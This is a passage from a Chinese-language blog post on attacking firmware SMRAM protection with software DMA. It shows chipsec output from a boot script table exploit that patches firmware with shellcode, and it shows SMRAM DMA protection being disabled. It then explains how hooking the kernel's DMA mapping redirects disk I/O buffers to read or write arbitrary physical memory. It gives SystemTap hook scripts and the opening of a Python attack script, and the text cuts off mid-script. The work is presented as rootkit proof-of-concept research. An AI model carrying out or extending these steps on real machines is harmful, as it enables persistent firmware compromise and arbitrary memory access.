<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">localhost chipsec # python chipsec_main.py -m smm_dma</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[+] loaded chipsec.modules.smm_dma</span><br><span class="line">[*] running loaded modules ..</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] running module: chipsec.modules.smm_dma</span><br><span class="line">[*] Module path: /usr/src/chipsec/source/tool/chipsec/modules/smm_dma.pyc</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[x][ Module: SMRAM DMA Protection</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[*] Registers:</span><br><span class="line">[*] PCI0.0.0_TOLUD = 0xDFA00001 &lt;&lt; Top of Low Usable DRAM (b:d.f 00:00.0 + 0xBC)</span><br><span class="line">    [00] LOCK             = 1 &lt;&lt; Lock</span><br><span class="line">    [20] TOLUD            = DFA &lt;&lt; Top of Lower Usable DRAM</span><br><span class="line">[*] PCI0.0.0_BGSM = 0xD7800001 &lt;&lt; Base of GTT Stolen Memory (b:d.f 00:00.0 + 0xB4)</span><br><span class="line">    [00] LOCK             = 1 &lt;&lt; Lock</span><br><span class="line">    [20] BGSM             = D78 &lt;&lt; Base of GTT Stolen Memory</span><br><span class="line">[*] PCI0.0.0_TSEGMB = 0xD7000001 &lt;&lt; TSEG Memory Base (b:d.f 00:00.0 + 0xB8)</span><br><span class="line">    [00] LOCK             = 1 &lt;&lt; Lock</span><br><span class="line">    [20] TSEGMB           = D70 &lt;&lt; TSEG Memory Base</span><br><span class="line">[*] IA32_SMRR_PHYSBASE = 0xD7000006 &lt;&lt; SMRR Base Address MSR (MSR 0x1F2)</span><br><span class="line">    [00] Type             = 6 &lt;&lt; SMRR memory type</span><br><span class="line">    [12] PhysBase         = D7000 &lt;&lt; SMRR physical base address</span><br><span class="line">[*] IA32_SMRR_PHYSMASK = 0xFF800800 &lt;&lt; SMRR Range Mask MSR (MSR 0x1F3)</span><br><span class="line">    [11] Valid            = 1 &lt;&lt; SMRR valid</span><br><span class="line">    [12] PhysMask         = FF800 &lt;&lt; SMRR address range mask</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] Memory Map:</span><br><span class="line">[*]   Top Of Low Memory             : 0xDFA00000</span><br><span class="line">[*]   TSEG Range (TSEGMB-BGSM)      : [0xD7000000-0xD77FFFFF]</span><br><span class="line">[*]   SMRR Range (size = 0x00800000): [0xD7000000-0xD77FFFFF]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] checking locks..</span><br><span class="line">[+]   TSEGMB is locked</span><br><span class="line">[+]   BGSM is locked</span><br><span class="line">[*] checking TSEG alignment..</span><br><span class="line">[+]   TSEGMB is 8MB aligned</span><br><span class="line">[*] checking TSEG covers entire SMRR range..</span><br><span class="line">[+]   TSEG covers entire SMRAM</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[+] PASSED: TSEG is properly configured. SMRAM is protected from DMA attacks</span><br></pre></td></tr></table></figure>


<p>如你所见：0xD7000000地址看起来是合法的，锁位也设置了。你还可以运行<a target="_blank" rel="noopener" href="https://github.com/chipsec/chipsec/blob/master/chipsec/modules/common/smrr.py">common.smrr</a>模块以确保用于保护SMRAM免受高速缓存攻击的系统管理区域寄存器也具有相同的物理地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">localhost chipsec # python chipsec_main.py -m common.smrr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[+] loaded chipsec.modules.common.smrr</span><br><span class="line">[*] running loaded modules ..</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] running module: chipsec.modules.common.smrr</span><br><span class="line">[*] Module path: /usr/src/chipsec/source/tool/chipsec/modules/common/smrr.pyc</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[x][ Module: CPU SMM Cache Poisoning / System Management Range Registers</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[+] OK. SMRR range protection is supported</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] Checking SMRR range base programming..</span><br><span class="line">[*] IA32_SMRR_PHYSBASE = 0xD7000006 &lt;&lt; SMRR Base Address MSR (MSR 0x1F2)</span><br><span class="line">    [00] Type             = 6 &lt;&lt; SMRR memory type</span><br><span class="line">    [12] PhysBase         = D7000 &lt;&lt; SMRR physical base address</span><br><span class="line">[*] SMRR range base: 0x00000000D7000000</span><br><span class="line">[*] SMRR range memory type is Writeback (WB)</span><br><span class="line">[+] OK so far. SMRR range base is programmed</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] Checking SMRR range mask programming..</span><br><span class="line">[*] IA32_SMRR_PHYSMASK = 0xFF800800 &lt;&lt; SMRR Range Mask MSR (MSR 0x1F3)</span><br><span class="line">    [11] Valid            = 1 &lt;&lt; SMRR valid</span><br><span class="line">    [12] PhysMask         = FF800 &lt;&lt; SMRR address range mask</span><br><span class="line">[*] SMRR range mask: 0x00000000FF800000</span><br><span class="line">[+] OK so far. SMRR range is enabled</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] Verifying that SMRR range base &amp; mask are the same on all logical CPUs..</span><br><span class="line">[CPU0] SMRR_PHYSBASE = 00000000D7000006, SMRR_PHYSMASK = 00000000FF800800</span><br><span class="line">[CPU1] SMRR_PHYSBASE = 00000000D7000006, SMRR_PHYSMASK = 00000000FF800800</span><br><span class="line">[CPU2] SMRR_PHYSBASE = 00000000D7000006, SMRR_PHYSMASK = 00000000FF800800</span><br><span class="line">[CPU3] SMRR_PHYSBASE = 00000000D7000006, SMRR_PHYSMASK = 00000000FF800800</span><br><span class="line">[+] OK so far. SMRR range base/mask match on all logical CPUs</span><br><span class="line">[*] Trying to read memory at SMRR base 0xD7000000..</span><br><span class="line">[+] PASSED: SMRR reads are blocked in non-SMM mode</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[+] PASSED: SMRR protection against cache attack is properly configured</span><br></pre></td></tr></table></figure>


<p>运行<code>boot_script_table</code>漏洞利用脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">localhost chipsec # python chipsec_main.py -m boot_script_table</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[+] loaded chipsec.modules.boot_script_table</span><br><span class="line">[*] running loaded modules ..</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] running module: chipsec.modules.boot_script_table</span><br><span class="line">[*] Module path: /usr/src/chipsec/source/tool/chipsec/modules/boot_script_table.pyc</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[x][ Module: UEFI boot script table vulnerability exploit</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[*] AcpiGlobalVariable = 0xd5f53f18</span><br><span class="line">[*] UEFI boot script addr = 0xd5f4c018</span><br><span class="line">[*] Target function addr = 0xd5ddf260</span><br><span class="line">8 bytes to patch</span><br><span class="line">Found 106 zero bytes for shellcode at 0xd5deaf96</span><br><span class="line">Jump from 0xd5deaffb to 0xd5ddf268</span><br><span class="line">Jump from 0xd5ddf260 to 0xd5deaf96</span><br><span class="line">Going to S3 sleep for 10 seconds ...</span><br><span class="line">rtcwake: assuming RTC uses UTC ...</span><br><span class="line">rtcwake: wakeup from &quot;mem&quot; using /dev/rtc0 at Tue Aug 25 08:14:15 2015</span><br><span class="line">[*] BIOS_CNTL = 0x28</span><br><span class="line">[*] TSEGMB = 0xd7000000</span><br><span class="line">[!] Bios lock enable bit is not set</span><br><span class="line">[!] SMRAM is not locked</span><br><span class="line">[!] Your system is VULNERABLE</span><br></pre></td></tr></table></figure>


<p>检查<code>TSEGMB</code>寄存器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">localhost chipsec # python chipsec_main.py -m smm_dma</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[+] loaded chipsec.modules.smm_dma</span><br><span class="line">[*] running loaded modules ..</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] running module: chipsec.modules.smm_dma</span><br><span class="line">[*] Module path: /usr/src/chipsec/source/tool/chipsec/modules/smm_dma.pyc</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[x][ Module: SMRAM DMA Protection</span><br><span class="line">[x][ =======================================================================</span><br><span class="line">[*] Registers:</span><br><span class="line">[*] PCI0.0.0_TOLUD = 0xDFA00001 &lt;&lt; Top of Low Usable DRAM (b:d.f 00:00.0 + 0xBC)</span><br><span class="line">    [00] LOCK             = 1 &lt;&lt; Lock</span><br><span class="line">    [20] TOLUD            = DFA &lt;&lt; Top of Lower Usable DRAM</span><br><span class="line">[*] PCI0.0.0_BGSM = 0xD7800001 &lt;&lt; Base of GTT Stolen Memory (b:d.f 00:00.0 + 0xB4)</span><br><span class="line">    [00] LOCK             = 1 &lt;&lt; Lock</span><br><span class="line">    [20] BGSM             = D78 &lt;&lt; Base of GTT Stolen Memory</span><br><span class="line">[*] PCI0.0.0_TSEGMB = 0xFF000001 &lt;&lt; TSEG Memory Base (b:d.f 00:00.0 + 0xB8)</span><br><span class="line">    [00] LOCK             = 1 &lt;&lt; Lock</span><br><span class="line">    [20] TSEGMB           = FF0 &lt;&lt; TSEG Memory Base</span><br><span class="line">[*] IA32_SMRR_PHYSBASE = 0xD7000006 &lt;&lt; SMRR Base Address MSR (MSR 0x1F2)</span><br><span class="line">    [00] Type             = 6 &lt;&lt; SMRR memory type</span><br><span class="line">    [12] PhysBase         = D7000 &lt;&lt; SMRR physical base address</span><br><span class="line">[*] IA32_SMRR_PHYSMASK = 0xFF800800 &lt;&lt; SMRR Range Mask MSR (MSR 0x1F3)</span><br><span class="line">    [11] Valid            = 1 &lt;&lt; SMRR valid</span><br><span class="line">    [12] PhysMask         = FF800 &lt;&lt; SMRR address range mask</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] Memory Map:</span><br><span class="line">[*]   Top Of Low Memory             : 0xDFA00000</span><br><span class="line">[*]   TSEG Range (TSEGMB-BGSM)      : [0xFF000000-0xD77FFFFF]</span><br><span class="line">[*]   SMRR Range (size = 0x00800000): [0xD7000000-0xD77FFFFF]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[*] checking locks..</span><br><span class="line">[+]   TSEGMB is locked</span><br><span class="line">[+]   BGSM is locked</span><br><span class="line">[*] checking TSEG alignment..</span><br><span class="line">[+]   TSEGMB is 8MB aligned</span><br><span class="line">[*] checking TSEG covers entire SMRR range..</span><br><span class="line">[-]   TSEG doesn&#x27;t cover entire SMRAM</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">[-] FAILED: TSEG is not properly configured. SMRAM is vulnerable to DMA attacks</span><br></pre></td></tr></table></figure>


<p>ok，SMRAM的DMA保护已经被禁用了，我们可以进入下一步了。当然，对专门设计的硬件执行这样的攻击是完全没有意义的：我们想在没有对目标平台的进行任何物理访问的情况下破坏所有的东西，这意味着我们需要用设备驱动程序代码劫持由操作系统发起的DMA事件。</p>
<h2 id="使用SystemTap-Hook-Linux内核"><a href="#使用SystemTap-Hook-Linux内核" class="headerlink" title="使用SystemTap Hook Linux内核"></a>使用SystemTap Hook Linux内核</h2><p>DMA软件攻击是由Rafal Wojtczuk在他的“Subverting the Xen hypervisor”演讲中提出的：</p>
<ol>
<li>为了读取任意物理内存，攻击者会用<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/open.2.html">open()</a>函数的<code>O_DIRECT</code> flag来打开一个空文件，该文件需要绕过文件系统缓存。</li>
<li>然后攻击者使用<a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap()</a>分配一个虚拟的虚拟内存缓冲区，并使用<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/write.2.html">write()</a>系统调用将其写入打开的文件。</li>
<li>在磁盘写调度过程中，Linux内核的ATAPI驱动程序调用<a target="_blank" rel="noopener" href="http://mirror.linux.org.au/linux-mandocs/2.6.4-cset-20040312_2111/dma_map_sg.html">dma_map_sg()</a>函数来设置物理内存缓冲区，以进行分散-聚集 DMA操作。攻击者需要先hook此函数，以迭代在<code>scatterlist </code>结构体中传递的内存缓冲区信息，找到之前分配的缓冲区物理地址，并将其替换为他需要读取的物理内存的地址。</li>
<li>当<code>write()</code>函数成功返回时——攻击者可以从文件中读取数据以获取存储的内存内容。</li>
</ol>
<p>任意物理内存地址的写入场景几乎和它相同，只是攻击者使用的是<code>read()</code>系统调用而不是write()。<br>内核文档中的“Dynamic DMA mapping Guide”（<a target="_blank" rel="noopener" href="http://dma-api-howto.txt/">DMA-API-HOWTO.TXT</a>）是帮助你开始使用Linux DMA API进行设备驱动程序开发的指南。分配给 分散-聚集 DMA操作的内存区域由<code>scatterlist</code>结构体表示。下面是<a target="_blank" rel="noopener" href="http://lxr.free-electrons.com/source/include/asm-generic/scatterlist.h#L6">内核头文件</a>的定义，内存缓冲区的物理地址被传递给<code>read()</code>&#x2F;<code>write()</code>系统调用，通常在<code>dma_address</code>字段中:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SG</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>   sg_magic;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>   page_link;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>    offset;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>    length;</span><br><span class="line">        <span class="type">dma_addr_t</span>      dma_address;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NEED_SG_DMA_LENGTH</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>    dma_length;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>Rafal使用了可加载的内核模块来Hook <code>dma_map_sg()</code>函数。不幸的是，在我的Linux内核版本中，此函数被定义为<a target="_blank" rel="noopener" href="http://lxr.free-electrons.com/source/include/asm-generic/dma-mapping-common.h#L181">简单宏</a>，被扩展为<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/source/include/asm-generic/dma-mapping-common.h#L46">dma_map_sg_attrs()</a>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> dma_map_sg(d, s, n, r) dma_map_sg_attrs(d, s, n, r, NULL)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">dma_map_sg_attrs</span><span class="params">(<span class="keyword">struct</span> device *dev, <span class="keyword">struct</span> scatterlist *sg,</span></span><br><span class="line"><span class="params">                                   <span class="type">int</span> nents, <span class="keyword">enum</span> dma_data_direction dir,</span></span><br><span class="line"><span class="params">                                   <span class="keyword">struct</span> dma_attrs *attrs)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dma_map_ops</span> *<span class="title">ops</span> =</span> get_dma_ops(dev);</span><br><span class="line">        <span class="type">int</span> i, ents;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> *<span class="title">s</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        for_each_sg(sg, s, nents, i)</span><br><span class="line">                kmemcheck_mark_initialized(sg_virt(s), s-&gt;length);</span><br><span class="line">        BUG_ON(!valid_dma_direction(dir));</span><br><span class="line">        ents = ops-&gt;map_sg(dev, sg, nents, dir, attrs);</span><br><span class="line">        BUG_ON(ents &lt; <span class="number">0</span>);</span><br><span class="line">        debug_dma_map_sg(dev, sg, nents, ents, dir);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> ents;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>由于<code>dma_map_sg_attrs()</code>是一个内联函数 —— 使得我们无法用简单的方法找到并Hook其代码，因此必须找到其他解决方案。如下，有一个<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/source/include/linux/dma-debug.h#L47">debug_dma_map_sg() </a>函数的调用也可以Hook：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">debug_dma_map_sg</span><span class="params">(<span class="keyword">struct</span> device *dev, <span class="keyword">struct</span> scatterlist *sg,</span></span><br><span class="line"><span class="params">                             <span class="type">int</span> nents, <span class="type">int</span> mapped_ents, <span class="type">int</span> direction)</span>;</span><br></pre></td></tr></table></figure>

<p>实际上，只有在使用<code>CONFIG_DMA_API_DEBUG</code>选项编译该函数时，此函数才会在内核二进制文件中出现，并且你最喜欢的Linux发行版不太可能使用该函数——因此我们必须从源代码配置和构建新内核。这种限制并不是太好，但为了证明概念，它似乎不是很重要。另外，在实际使用可靠的固件rootkit的情况下，仍然可以实现一些二进制试探法来定位内联函数<code>dma_map_sg_attrs()</code>的代码，但是这并不在本文的讨论范围内。<br>为了使DMA攻击的PoC更简单一些，我在SystemTap的帮助下实现了<code>debug_dma_map_sg()</code>函数钩子，而不是徒手编写一个可加载的内核模块。SystemTap是<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/DTrace">DTrace</a>的Linux克隆版本，它允许开发人员和管理员用<a target="_blank" rel="noopener" href="https://sourceware.org/systemtap/langref/">简化的类c语言</a>编写脚本，以检查Linux系统的活动。SystemTap的工作方式是将脚本翻译成C语言，然后运行system C编译器创建一个内核模块。加载模块后，它通过Hook到内核来激活所有探测到的事件。<br>下面你可以看到一个简单的SystemTap脚本，它Hook <code>debug_dma_map_sg()</code>函数，并将它的参数信息打印到stdout中:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># kernel function probe handler</span><br><span class="line">#</span><br><span class="line">probe kernel.function(&quot;debug_dma_map_sg&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%s(%d): %s(): %d\n&quot;, execname(), pid(), probefunc(), $nents);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    #</span><br><span class="line">    # Each call to sys_write() leads to corresponding call of dma_map_sg(),</span><br><span class="line">    # $sg argument contains list of DMA buffers</span><br><span class="line">    #</span><br><span class="line">    for (i = 0; i &lt; $nents; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot; #%d (0x%x): 0x%x\n&quot;, i, $sg[i]-&gt;length, $sg[i]-&gt;dma_address);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>在基于debian的系统上，可以使用<code>apt-get install SystemTap</code>命令安装SystemTap。如果你想从<a target="_blank" rel="noopener" href="https://sourceware.org/systemtap/wiki/SystemTapWithSelfBuiltKernel">源代码</a>安装它——请确保你在编译内核时启用了以下选项：</p>
<ul>
<li><p><code>CONFIG_DEBUG_INFO</code></p>
</li>
<li><p><code>CONFIG_KPROBES</code></p>
</li>
<li><p><code>CONFIG_RELAY</code></p>
</li>
<li><p><code>CONFIG_DEBUG_FS</code></p>
</li>
<li><p><code>CONFIG_MODULES</code></p>
</li>
<li><p><code>CONFIG_MODULE_UNLOAD</code></p>
</li>
<li><p><code>CONFIG_UPROBES</code></p>
</li>
</ul>
<p>现在让我们来尝试使用<a target="_blank" rel="noopener" href="https://sourceware.org/systemtap/man/stap.1.html">stap</a>命令运行测试脚本:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">localhost ~ <span class="comment"># stap -v debug_dma_map_sg.stp</span></span><br><span class="line">Pass 1: parsed user script and 109 library script(s) using 62180virt/36436res/4264shr/32980data kb, <span class="keyword">in</span> 160usr/10sys/171real ms.</span><br><span class="line">Pass 2: analyzed script: 1 probe(s), 11 <span class="keyword">function</span>(s), 4 embed(s), 0 global(s) using 108852virt/84660res/5780shr/79652data kb, <span class="keyword">in</span> 790usr/210sys/997real ms.</span><br><span class="line">Pass 3: translated to C into <span class="string">&quot;/tmp/stapo6EAoq/stap_be741121b1c20b85b38ff640ac798be6_6031_src.c&quot;</span> using 108852virt/84788res/5908shr/79652data kb, <span class="keyword">in</span> 190usr/50sys/237real ms.</span><br><span class="line">Pass 4: compiled C into <span class="string">&quot;stap_be741121b1c20b85b38ff640ac798be6_6031.ko&quot;</span> <span class="keyword">in</span> 3430usr/290sys/4579real ms.</span><br><span class="line">Pass 5: starting run.</span><br><span class="line">usb-storage(1110): debug_dma_map_sg(): 9</span><br><span class="line"><span class="comment">#0 (0x1000): 0x3ecca2000</span></span><br><span class="line"><span class="comment">#1 (0x1000): 0x2f34000</span></span><br><span class="line"><span class="comment">#2 (0x1000): 0x41e2b4000</span></span><br><span class="line"><span class="comment">#3 (0x1000): 0xd671e000</span></span><br><span class="line"><span class="comment">#4 (0x1000): 0x41e22e000</span></span><br><span class="line"><span class="comment">#5 (0x1000): 0x40687b000</span></span><br><span class="line"><span class="comment">#6 (0x1000): 0x4061b9000</span></span><br><span class="line"><span class="comment">#7 (0x1000): 0xd670e000</span></span><br><span class="line"><span class="comment">#8 (0x1000): 0x41ddc0000</span></span><br><span class="line">usb-storage(1110): debug_dma_map_sg(): 1</span><br><span class="line"><span class="comment">#0 (0x1000): 0x4027e000</span></span><br><span class="line">usb-storage(1110): debug_dma_map_sg(): 2</span><br><span class="line"><span class="comment">#0 (0x1000): 0x4023d6000</span></span><br><span class="line"><span class="comment">#1 (0x1000): 0x3f7be6000</span></span><br><span class="line">usb-storage(1110): debug_dma_map_sg(): 1</span><br><span class="line"><span class="comment">#0 (0x1000): 0x406595000</span></span><br><span class="line">usb-storage(1110): debug_dma_map_sg(): 1</span><br><span class="line"><span class="comment">#0 (0x1000): 0x41e1fb000</span></span><br><span class="line">usb-storage(1110): debug_dma_map_sg(): 2</span><br><span class="line"><span class="comment">#0 (0x1000): 0xd5460000</span></span><br><span class="line"><span class="comment">#1 (0x1000): 0xd522f000</span></span><br><span class="line">usb-storage(1110): debug_dma_map_sg(): 2</span><br></pre></td></tr></table></figure>


<h2 id="编写DMA攻击脚本"><a href="#编写DMA攻击脚本" class="headerlink" title="编写DMA攻击脚本"></a>编写DMA攻击脚本</h2><p>我决定在Python上编写DMA攻击脚本，和我以前的文章中提到的工具一样。首先，我们需要实现DMA缓冲器劫持。下面的SystemTap脚本(存储为Python字符串变量)接受传递给<code>read()</code>&#x2F;<code>write()</code>的内存缓冲区的物理地址作为第一个参数，而我们需要读&#x2F;写的物理内存的目标地址将作为第二个参数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># print more information from running SystemTap script</span><br><span class="line">VERBOSE = False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># script source code</span><br><span class="line">SCRIPT_CODE 